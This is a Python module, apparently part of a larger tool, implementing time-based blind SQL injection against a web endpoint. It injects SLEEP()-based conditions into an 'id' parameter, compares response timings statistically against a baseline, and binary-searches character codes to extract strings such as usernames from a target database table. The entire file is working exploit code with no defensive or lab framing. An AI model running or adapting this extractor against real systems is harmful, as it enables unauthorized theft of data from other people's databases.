"""
Character extraction using binary search algorithm.
Finds characters faster than linear search by using binary search.
"""

from typing import Optional, List
import time
import requests
from .stats import TimingAnalyzer


class BinarySearchExtractor:
    """Extracts characters using binary search instead of linear search."""
    
    def __init__(self, base_url: str, payload_template: str, 
                 delay_seconds: float = 2.0, analyzer: Optional[TimingAnalyzer] = None):
        """
        Initialize the extractor.
        
        Args:
            base_url: Base URL of vulnerable endpoint
            payload_template: SQL injection payload template with {condition} placeholder
            delay_seconds: Base delay to use in SQL SLEEP() functions
            analyzer: TimingAnalyzer instance (creates default if None)
        """
        self.base_url = base_url
        self.payload_template = payload_template
        self.delay_seconds = delay_seconds
        self.analyzer = analyzer or TimingAnalyzer()
        self.session = requests.Session()
        
        # Cache for timing measurements
        self.baseline_cache: Optional[List[float]] = None
    
    def _measure_request_time(self, payload: str, samples: int = 3) -> List[float]:
        """
        Measure request timing multiple times for statistical reliability.
        
        Args:
            payload: Complete payload to send
            samples: Number of samples to collect
            
        Returns:
            List of timing measurements
        """
        timings = []
        for _ in range(samples):
            start = time.time()
            try:
                self.session.get(self.base_url, params={'id': payload}, timeout=30)
            except requests.RequestException:
                pass
            timings.append(time.time() - start)
        return timings
    
    def _establish_baseline(self, samples: int = 10) -> List[float]:
        """
        Establish baseline timing by measuring requests without delays.
        
        Args:
            samples: Number of baseline samples
            
        Returns:
            List of baseline timing measurements
        """
        if self.baseline_cache is not None:
            return self.baseline_cache
        
        # Use a condition that's always false (no delay)
        baseline_payload = self.payload_template.format(condition="1=0")
        baseline_timings = self._measure_request_time(baseline_payload, samples)
        self.baseline_cache = baseline_timings
        return baseline_timings
    
    def _test_condition(self, condition: str, samples: int = 5) -> bool:
        """
        Test if a SQL condition is true by measuring timing.
        
        Args:
            condition: SQL condition to test (e.g., "ASCII(SUBSTRING(...)) > 64")
            samples: Number of samples to collect
            
        Returns:
            True if condition appears to be true (significant delay detected)
        """
        # Establish baseline if needed
        baseline = self._establish_baseline()
        
        # Create payload with delay if condition is true
        # Format: condition can include SLEEP() or the template handles it
        if "SLEEP" not in condition.upper():
            payload = self.payload_template.format(
                condition=f"({condition}) AND SLEEP({self.delay_seconds})"
            )
        else:
            # Condition already includes delay logic
            payload = self.payload_template.format(condition=condition)
        
        test_timings = self._measure_request_time(payload, samples)
        
        # Use statistical test to determine significance
        is_significant, p_value = self.analyzer.is_significant_delay(
            baseline, test_timings
        )
        
        return is_significant
    
    def extract_character_binary(self, position: int, table: str = "users", 
                                 column: str = "username", 
                                 where_clause: str = "1=1") -> Optional[str]:
        """
        Extract a single character at a position using binary search.
        
        Args:
            position: Character position (1-indexed)
            table: Table name to query
            column: Column name to extract from
            where_clause: WHERE clause for the query
            
        Returns:
            Extracted character or None if not found
        """
        # Binary search on ASCII range of printable characters
        # Typical range: 32 (space) to 126 (~) = 95 characters
        low = 32
        high = 126
        
        # Character extraction query template
        char_query = f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {where_clause} LIMIT 1), {position}, 1))"
        
        # Binary search
        while low <= high:
            mid = (low + high) // 2
            
            # Test if character >= mid
            condition = f"{char_query} >= {mid}"
            if self._test_condition(condition):
                low = mid + 1
            else:
                high = mid - 1
        
        # Check if we found a valid character
        if 32 <= high <= 126:
            return chr(high)
        return None
    
    def extract_string(self, table: str = "users", column: str = "username",
                      where_clause: str = "1=1", max_length: int = 100) -> str:
        """
        Extract a complete string by extracting characters sequentially.
        
        Args:
            table: Table name to query
            column: Column name to extract from
            where_clause: WHERE clause for the query
            max_length: Maximum string length to extract
            
        Returns:
            Extracted string
        """
        result = ""
        
        for position in range(1, max_length + 1):
            char = self.extract_character_binary(position, table, column, where_clause)
            if char is None:
                break
            result += char
            
            # Stop if we hit a null terminator or common delimiter
            if char in ['\x00', '\n', '\r']:
                break
            
            print(f"[*] Extracted so far: {result}", end='\r')
        
        print()  # New line after progress
        return result.rstrip('\x00\n\r')

